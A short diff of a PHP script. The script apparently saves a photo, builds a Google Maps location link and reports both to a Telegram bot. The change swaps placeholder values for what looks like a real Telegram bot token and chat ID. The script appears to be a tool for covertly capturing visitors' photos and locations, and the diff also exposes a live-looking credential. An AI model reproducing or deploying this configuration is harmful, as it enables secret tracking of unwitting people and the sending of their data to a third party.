@@ -84,8 +84,8 @@ file_put_contents($filename, $photoData);
 
 // Token dan Chat ID Telegram
 // Buatan Algaza IG @cosplaysulit
-$token = 'Token_Telegram_Mu';
-$chat_id = 'Chat_ID_MU';
+$token = '7329000179:AAFgFH2vfFHDdP9w5SYfO5uw3e4ai6lMF8E';
+$chat_id = '5831789218';
 
 // Buat Link Google Maps
 // Buatan Algaza IG @cosplaysulit
